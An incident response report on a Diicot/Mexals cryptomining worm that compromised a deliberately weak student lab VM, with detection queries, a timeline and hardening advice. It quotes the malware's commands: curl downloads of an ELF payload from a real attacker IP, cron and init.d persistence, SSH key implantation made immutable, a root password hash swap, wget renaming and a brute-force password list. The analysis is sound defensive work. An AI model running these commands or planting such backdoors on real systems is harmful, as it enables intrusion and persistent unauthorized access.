# Executive Summary

On January 30, 2026, a student Linux virtual machine `linux-programmatic-fix-michael` in the Cyber Range environment was fully compromised by an automated cryptomining malware campaign known as **Diicot _(aka Mexals)_**. The malware exploited intentionally weak authentication configured for a lab exercise, installing unauthorized software, creating persistent backdoors, and performing reconnaissance.

The compromise occurred less than 15 minutes after the student updated credentials. The malware attempted to evade detection by clearing logs and obfuscating file names. No active cryptocurrency miner processes were observed running at the time of investigation; however, the malware's setup actions were consistent with preparation for mining operations.

The affected virtual machine has since been destroyed following the conclusion of the student's lab session. The system had been deployed for approximately five days. Subsequent students participating in the same lab remain potential targets, as the lab configuration aligns with the malware's initial access method.

**This incident closely mirrors a prior _April 2025_ breach involving the same campaign**. During this earlier compromise, the malware conducted nearly _250,000 outbound IP_ scans from the Cyber Range network to the publix internet. Some of those scans targeted high-profile domains, including **YouTube and Twitter**, which resulted in **external abuse complaints**.Because the malicious traffic originated from our Microsoft tenant, Azure attributed responsibility to the Cyber Range environment and temporarily restricted network resources.

Following the April 2025 event, containment and segmentation improvements were implemented. As a result, during the January 2026 compromise, scanning behavior was successfully constrained to the internal subnet and did not generate external abuse reports or trigger Microsoft Azure Safeguard enforcement actions.

<br>

**Key Points for Leadership:**

| Event | Observed Outcome |
|-------|-----------------|
| Initial Compromise | Malware successfully executed on student VM |
| Unauthorized Access | Root-level account accessed without permission |
| Persistence | Backdoors created to maintain long-term access |
| Internal Scanning | Updated NSG rules limited scanning to subnet |
| Evasion | Logs were cleared and binaries renamed |
| Cloud Response | No response from Azure cloud services |

# Incident Response Lifecycle

# Preparation: 

### Authentication Lab Context

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to intentionally trigger findings for Tenable scans.

<br>

<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />

<br>

Lab configuration included:
- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected findings in Tenable for followup remediation

<br>

**Students are instructed to destroy VM asap when lab is finished** to avoid compromise <br>
<img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />

<br>

---

### NSG Rules for Cryptomining

- Outbound rules for _SSH_ and common crypto miner ports denied:
   - Ports 22, 3333, 4444, 5555, etc.
- VMs can continue Root Labs without scanning outbound IPs, even if compromised

# Detection

### Malware or PUA Alert in MDE

- MDE generates alert **Malware or PUA** activity on Linux host
- Alert correlated with suspicious processes occurring under `root`

<Br>

<img width="1280" height="648" alt="image" src="https://github.com/user-attachments/assets/23305203-e6f9-4434-918b-dd3c6c2dceb1" /> <br>

<br>

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
 
    <br>
   
- Along with potentially suspicious commands:
   - `wget` _Remote file download_
   - `curl` _Transfers data. Similar to wget_
   - `chmod` _Permission modification_
   - `cron` _Scheduled task for Linux_
   - `dash` _Lightweight shell used to execute scripts_
 
     <Br>

# Analysis

### First Look Into Compromised Device

- Multiple reconiassance commands observed:
   - `la -la` _Lists files/directories, including hidden ones `-a` with permissions `-l`_
   - `who` _Shows logged-in users_
   - `cat /etc/resolv.conf` _reads contents of `/etc/resolv.conf`, typically contains DNS resolver configuration_
   - `uptime` _Displays how long the system has been running, number of users, load averages_
   - `cd /etc` _changes the working directory to `/etc` directory_

```kql
DeviceProcessEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated desc
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessParentFileName, ProcessCommandLine
```

<img width="1144" height="326" alt="image" src="https://github.com/user-attachments/assets/d4180bbb-a5bd-4228-849a-da6448cde0a9" />

<br>

- **What this means:**
   - A persistent root-level session existed for _~5 days_
   - That session repeatedly executed _estimated thousands of_ short-lived binaries
   - Each binary executes for _~5 seconds_ before writing a new file
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity
 
    <Br>

Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.

**More examples:** <br>
<img width="133" height="292" alt="image" src="https://github.com/user-attachments/assets/df4e9d8a-4e05-4b19-a63e-16ee2aa2c3ae" />

<Br>

- **Files are located at '/usr/bin'**
   - Only root can write to `/usr/bin`
   - Regular users cannot create files there
   - It’s considered a protected system directory
   - **`/usr/bin/` survives reboots**
 
  <br>

<img width="734" height="391" alt="image" src="https://github.com/user-attachments/assets/5684e222-a1e2-49c1-9704-25df36ce4211" />

<br>

 - Even though the files are presumably the same:
   - Each SHA256 hash is different
   - File sizes change slightly
   - Malware could modify itself purposely to avoid detection
   - Things like wallet addresses and ports could change within the file

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" /> <br>

<Br>

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within _milliseconds_ of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

### Student & Malicious IP Logins

**Security researchers have measured that:**
- A newly exposed SSH service often receives login attempts within minutes
- Sometimes within 30–90 seconds

<br>

```kql
DeviceLogonEvents
| where DeviceName contains "fix-michael"
| where RemoteIP == "129.212.178.38"
| where TimeGenerated >= ago(20d)
| project
    TimeGenerated,
    RemoteIP,
    ActionType,
    InitiatingProcessAccountName,
    AccountName,
    RemoteIPType,
    InitiatingProcessFolderPath,
    InitiatingProcessCommandLine
| order by TimeGenerated asc
```

<br>

**Student logs on at _1:35:55_ as _labuser_ via SSH**
- Student begins lab, telnet install & update root password

 <br>

<img width="1155" height="282" alt="image" src="https://github.com/user-attachments/assets/1ccd7da3-8463-4945-9079-bfa2fa9b7cd7" /> <br>

<br>

**_1:56_ malicious IP beings brute force password attack**

<Br>

<img width="1154" height="281" alt="image" src="https://github.com/user-attachments/assets/4c2f8d47-b748-4968-9725-d292e27fa7a7" /> <br>

<Br>

IP **successfully logs in** at _2:02_
- Despite the successful login, password guessing continues until 2:30
- Usernames contain some default Linux service accounts

<br>

<img width="1089" height="311" alt="image" src="https://github.com/user-attachments/assets/06958de7-721f-4657-b420-597eca2d52ba" /> <br>

<br>

_labuser_ is one of the usernames attempting to sign in, suggesting the malware has been updated with Cyber Range username context

<Br>

<img width="1082" height="324" alt="image" src="https://github.com/user-attachments/assets/aac7bec9-2e31-4609-b296-1589aaeeb247" />

<Br>

### First Compromise Artifact

- Student begins the lab, changing root password to _root_
   - _2026-01-30T`13:50`:32.826013Z_ — `/etc/shadow` edited by _Labuser_ via root (student password change)
   - _2026-01-30T`14:02`:04.257228Z_ ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
   - `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<br>

<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" /> <br>

| Timestamp       | File / Action                         | Notes                                                                                      |
|-----------------|--------------------------------------|--------------------------------------------------------------------------------------------|
| 2:02:04         | `AHTKzAEv` and multiple `x.sh` files | Initial payload and helper scripts                                                         |
| 2:02:04.957     | `retea` in `/dev/shm`                 | `/dev/shm` is shared memory; malware sometimes drops helpers here for fast execution or stealth (RAM-only execution) |
| 2:02:05         | `/root/.ssh/authorized_keys` updated | Allows persistence via SSH (attacker can log in without a password)                        |
| 2:02:05         | `/etc/passwd` and `/etc/shadow` updated | Confirms attacker escalated privileges / added backdoors |

<br>

- Repeated FileCreated / FileDeleted events for `x.sh` and `AHTKzAEv`
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection

     <Br>
     
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

### Malware Injects Password Hash for Root

- **Command:** _usermod -p ********** root_
   - `usermod` → _Linux command used to modify a user account_
   - `-p **********` → _Sets the user’s password hash directly (not plaintext)_
   - `root` → _The username being modified_
  
 <Br>

 <img width="1151" height="344" alt="image" src="https://github.com/user-attachments/assets/58e42a90-b7db-41a8-b939-cc96f061c592" />

<br>

- `**********` is the masked hash, so you don’t see it
- By replacing or adding a root hash with its own, malware creates a backdoor
- Student is still able to log in/continue session
- Student won't get booted off or have any indication compromise has happened
- This takes place just **12 minutes** after student's root password change
- Student wouldn't have had ample time to complete lab before device is compromised

 <br>

---

### SSH Brute Force on Internal Subnet

**Malware scans internal subnet `10.1.0.0/24`**
   - Malware uses compromised Cyber Range host to spread
   - Malware probes IP addresses in the range of _10.1.0.0 – 10.1.0.255_
   - Scan is looking for IPs that accept SSH connections, _Port 22_
   - If SSH is open, the malware tries common passwords for user accounts
     
   <br>
   
**Password exerpt from _retea_ script**

```
root root
root rootroot
root root123
root root123456
root 123456
root 123
```

 <br>

```kql
 DeviceNetworkEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| where RemotePort == "22" 
| project TimeGenerated, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, Protocol, RemoteIP, RemoteIPType, RemotePort
| order by TimeGenerated asc
```

<br>

<img width="1096" height="307" alt="image" src="https://github.com/user-attachments/assets/6efd8585-e0dc-4120-967f-cf6c4eb6779b" />

<Br>

- Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
- No _ConnectionSuccess_ was observed
- The scan went from 14:02:07 to 14:02:42, the entire subnet in **_less than one second_**

- The subnet gets scanned a second time at 2026-01-31T13:39:56 to 2026-01-31T13:40:45
- Again, no successfull logins observed
- This time, from a moved .network file running from memory

<Br>

<br>

**If it successfully logs in, it can restart the whole process:**
   - Install itself on the new host
   - Delete competing malware
   - Run miners (like xmrig or cnrig)
   - Hide traces (clear logs, remove bash history)

<br>
     
---

### diicot

- `kuak` and `diicot` created in _tmp_ folder shortly after `AHTKzAEv`
   - both files ran long code meant to terminate any existing miners
<img width="1174" height="342" alt="image" src="https://github.com/user-attachments/assets/2161b4c2-df21-4a20-ba11-47370b34a5cc" />

**Full command with annotations**
```bash
# --- Cleanup old folders & recreate working directory ---
rm -rf /var/tmp/Documents /tmp/cache             # Remove old malware staging directories and temp files
mkdir -p /var/tmp/Documents 2>&1                 # Recreate working directory

# --- Remove cron jobs & SSH keys for stealth/control ---
crontab -r                                       # Remove all user cron jobs
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1   # Remove immutable flags from SSH keys (so they can delete/replace)

# --- Prep malware files ---
cd /var/tmp
chattr -iae /var/tmp/Documents/.diicot          # Remove immutable flags from previously staged .diicot
mv /var/tmp/diicot /var/tmp/Documents/.diicot  # Move new diicot payload to working dir

```

- What this script is doing:
   - Terminating any potential competing malware/miners to free up CPU/resources
   - Setting up its working directory
   - Moving payload files into a hidden location
   - Making them executable
   - Running them in the background
   - Wiping evidence

### Persistence

### cron Scheduler 

- `cron` is a built-in Linux utility for scheduling tasks
   - these cron processes start at: `2026-01-30T14:04:23.447447Z`
   - and go on until: `2026-02-02T22:47:03.418251Z`
- these Cron tasks run _every minute_
- cron drops `.b4nd1d0` into `/var/tmp/`
- Executes hidden payload
- Rewrites cron to ensure it stays installed
- This illustrates post-compromise persistence

<img width="1175" height="342" alt="image" src="https://github.com/user-attachments/assets/42f58afa-b9c0-4b16-a493-319739ba0942" /> <br>

<br>

- many _tmp._ files in `/var/spool/cron/crontabs/` (like `tmp.RYF9JE` and `tmp.SHGiEW`) along with root crontab activity
- These are temporary cron files created when the malware manipulates the root crontab
- crontab writes to temp files first, then rename them into place
   - That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job

     <br>

**Crontab modification**
- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
   - malware will now run every 3 minutes

   <br>

   <img width="608" height="366" alt="image" src="https://github.com/user-attachments/assets/69f4d00b-3769-4bf3-9c9d-f52963e6c1ab" />

   <br>

### Linux Startup services 

**`ygljglkjgfg0` is created/copied to _/etc/init.d/_** <br>
- `/etc/init.d/` is used for startup services on Linux systems
   - That means it would run automatically at boot
- This confirms **intentional long-term persistence**. 

<Br>

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where FolderPath startswith "/etc/init.d"  
| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated desc  
```

<br>

<img width="2017" height="430" alt="image" src="https://github.com/user-attachments/assets/bd2124e1-4894-453b-aeaf-3438736562fe" /> <br>

<br>

### SSH Key Implantation

<br>

```
chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  
```

<br>

_01/30_, day of compromise, actor set root password hash <br>
_02/02_, actor adds their SSH public key to root's authorized_keys and makes the file immutable

**Why do both?**
   - Password-based backdoors can be changed or removed by system updates, resets, or admins
   - Implantation ensures they can always log in via key, even if root password is changed later
   - SSH key login may not generate password login attempts
   - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
   - Trivial fix for skilled linux users with root access
   - Otherwise can delay remediation and prolong system infection

**What this script is doing:**
   - Malware prepares environment (cleanup & setup scripts)
   - Staging directory created for payloads
   - SSH persistence established with attacker key
   - SSH key is protected from modification or removal
   - System info is exposed
   - Signal sent to confirm successful compromise
   - Student/root password changes are bypassed by attacker key

**Outcome:**
   - Full passwordless SSH access for attacker
   - Persistent backdoor hard to remove
   - Attacker added their own SSH key, alowing a silent login
   - depending on how system logs SSH, standard login record might not generate
   - This explains how the student wasn't booted: their account wasn’t actively interrupted

### Malicious Binary Download

**`p.txt` & `r.txt`**

- `curl http://23DOT160DOT56DOT194/p.txt -o ygljglkjgfg0`
   - `p.txt` malicious **ELF binary** (named as _.txt_)
   - `ygljglkjgfg0` renamed executable copy
- also observed: `curl http://23.160.56.194/r.txt -o sdf3fslsdf15`

<br> 

- malicious file output to `ygljglkjgfg0`
   - Downloaded via `curl` and `wget` from a remote host `23.160.56.194/p.txt`
   - First seen at `/usr/bin/ygljglkjgfg0` = persistent executable
   - Then copied to `/etc/init.d/ygljglkjgfg0` = run at boot
   - and `/etc/cron.hourly/gcc.sh` = run every hour or as scheduled

  <br>
  
- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
- obfuscated file names (_`tdrbhhtkky`_, _`omicykvmml`_):
  - Avoid hash-based detections
  - Avoids filename-based detections
  - Makes IOC-based hunting harder
  - Prevents defenders from blocking a single file
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
 
  
<Br>

- p.txt variants:
   - downloaded on two different devices
   - from same IP `23.160.56.194`
   - to the same file name `ygljglkjgfg`
   - on _1/27/2026_ and _2/2/2026_
   - both with the same file size `548616`
   - but with two different SHA256

- Malware keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file _.txt_ to avoid suspicion
   - Download → Rename → Execute

## Evasion:

### Binary Relocation & Renaming

**The attacker deliberately renamed trusted system binaries:**

```
mv /usr/bin/wget /usr/bin/good 
mv /bin/wget /bin/good
```  

- Allows continued payload delivery while bypassing detections

### Crypto Mining Worm

**retea Script reads in part:**

```bash
if key == [hardcoded string]
    echo ""
else
    echo Logged with successfully.
    rm -rf .retea
```

**Malware registration check**
- If the key matches → do nothing
- If the key does NOT match → print _'login successful'_ and delete `.retea`
- This appears to be the malware checking if it has already infected the system
   - If it has, it will terminate as to not disrupt the current mining

# Containment, Eradication, & Recovery

- Student's VM was destroyed on Feb. 03, five days after compromise
- VM was confirmed to have conducted 2 subnet scans, but **no successful logins were observed**
- No evidence of actual cryptomining observed
- No evidence of wallet id present in logs

#  Post-Event Activity (Lessons Learned)

### Conclusion

This incident represents a **full Linux system compromise** carried out by the automated **Diicot (_aka Mexals_) cryptomining worm**. The malware successfully exploited intentionally weak authentication settings during a student lab exercise, demonstrating how quickly exposed systems can be overtaken.

Less than **15 minutes** after the root password change, the attacker achieved root-level execution, deployed obfuscated binaries, established multiple persistence mechanisms, cleared logs, and initiated SSH scanning. This type of attack can be financially devastating for victims — in 2022, Sysdig suggested that for every US$1 of cryptominer profit, the victim loses approximately US$53. Although no active cryptominer process was ultimately observed, the malware performed all preparatory actions consistent with staging a mining operation, including terminating any potential competing miners, tuning system limits for maximum resource consumption, and maintaining redundant access paths.

The actor’s heavy use of renaming, deletion, in-memory execution, masking, and unintelligible filenames significantly complicated artifact continuity. This deliberate anti-forensic behavior made linear reconstruction difficult and highlights the operational complexity of the campaign. Microsoft Defender for Endpoint successfully detected malicious behavior early in the attack chain, enabling swift investigation and confirmation of compromise.

Compared to the **April 2025 compromise**, the impact was materially reduced. Updated Network Security Group (NSG) outbound restrictions limited scanning to the internal subnet and prevented large-scale external scanning. This improved containment posture resulted in no escalations from Azure Safeguard Team. However, the successful internal SSH probing demonstrates that additional inbound and lateral movement controls may be needed as **it's implied this campaign continues to scan public IP address ranges.**

<br>

### Key Takeaways

- Exposed systems can be compromised within minutes
- Weak authentication remains one of the most reliable initial access vectors
- Cryptomining worms often operate as full frameworks, not just simple miners
- Defense-in-depth significantly reduces impact
- Even without sensitive data, compromised systems can be used for malicious purposes
- Standard protocols alone may not be enough; layered monitoring and defenses are essential
- Focusing on the broader compromise patterns can be as sufficient as examining every minor malware action

  <br>

---

### Immediate Recovery

- Destroy affected virtual machines, if not needed for production 
- Remove unauthorized init scripts, cron jobs, and persistent backdoors  
- Rotate all credentials, SSH keys, and sensitive configuration secrets  
- Perform full system integrity verification before returning to production  
- Isolate and analyze affected VMs before rejoining the network  

### Monitoring & Detection Improvements

- Alert on writes to `/etc/init.d`, `/etc/cron.*`, and other startup directories  
- Monitor renaming or replacement of system binaries in `/bin` and `/usr/bin`  
- Detect suspicious in-memory execution and frequent deletion/moving of files  
- Flag repeated downloads from single external IPs or unusual domains  
- Alert on unauthorized modifications to `authorized_keys` or root password hashes  
- Track abnormal process spawning patterns, especially short-lived and randomized binaries  
- Correlate network activity with known attacker infrastructure or brute-force attempts  
- Maintain visibility on temporary directories like `/tmp` and `/dev/shm` for unexpected executable activity

## Romanian Influence

The Diicot/Mexals malware is widely documented
- Some of the filenames are in Romanian:
   - `b4nd1d0` a _leetspeak_ spelling of "Bandido" or "Bandit"
   - `diicot` the malware's namesake is an acronym for the Direcția de Investigare a Infracțiunilor de Criminalitate Organizată și Terorism (Directorate for Investigating Organized Crime and Terrorism)
   - `retea` literally translates to "Network"
This naming convention suggests the original author of the code and/or users are Romanian in nature
